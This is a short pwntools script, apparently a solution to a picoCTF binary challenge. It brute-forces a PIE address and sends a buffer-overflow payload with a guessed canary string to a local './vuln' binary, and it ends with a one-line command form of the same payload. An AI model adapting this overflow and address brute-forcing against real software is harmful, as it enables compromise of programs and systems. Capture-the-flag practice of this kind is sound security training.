from pwn import *

# Python Script (Copied and pasted onto shell server)
def bruteforce_pie():
  address = ''
  for e1 in range(0x00010000,0x01000000,0x10000): #0xFF0000 generates a full byte in hex followed by 4 zeros
    for e2 in range(0x1000,0x10000,0x1000): #0xF000 generates half a byte in hex followed by 3 zeros
      sh = process('./vuln')
      sh.sendlineafter('Please enter the length of the entry:\n> ', str(100))
      hex_str = 0x56000000+(e1)+(e2)+0x7ed
      print hex_str
      print format(hex_str, '#10x')
      sh.sendlineafter('Input> ', 'a'*32+"ex;Y"+"a"*16+p32(hex_str))
      output = sh.recvall()
      if 'picoCTF' in output:
        print output
        address = str(e1) + str(e2)
        print address
        return address
print bruteforce_pie()

# Command Form
# { echo "100"; python2 -c 'from pwn import *; print "a"*32+"ex;Y"+"a"*16+p32(0x560007ed)';} | ./vuln-my